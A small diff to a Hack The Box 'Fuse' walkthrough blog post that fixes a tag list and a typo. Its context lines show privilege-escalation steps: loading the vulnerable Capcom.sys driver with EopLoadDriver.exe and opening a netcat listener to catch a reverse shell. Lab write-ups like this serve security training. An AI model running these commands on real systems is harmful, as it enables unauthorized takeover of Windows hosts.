@@ -1,5 +1,5 @@
 +++
-tags = ["Box", "HTB", "Medium", "Windows", "Active Directory", "LDAP", "RPC", "SeLoadDriverPrivilege", "RPC", "Capcom"]
+tags = ["Box", "HTB", "Medium", "Windows", "Active Directory", "LDAP", "SeLoadDriverPrivilege", "RPC", "Capcom"]
 draft = false
 title = "Fuse HTB Walkthrough"
 author = "bloodstiller"
@@ -708,7 +708,7 @@ BrandNewPassword69!181128!!!!!
 2.  **Load the driver Run Exploit**:
     -   `.\EopLoadDriver.exe System\CurrentControlSet\Capcom C:\Users\svc-print\Documents\Capcom.sys`
     -   {{< figure src="/ox-hugo/2024-10-18-130552_.png" >}}
-    -   All 0's is good as a response, means we are wroking.
+    -   All 0's is good as a response, means we are working.
 
 3.  **Setup Listener**:
     -   `rlwrap -cAr nc -lnvp 443`
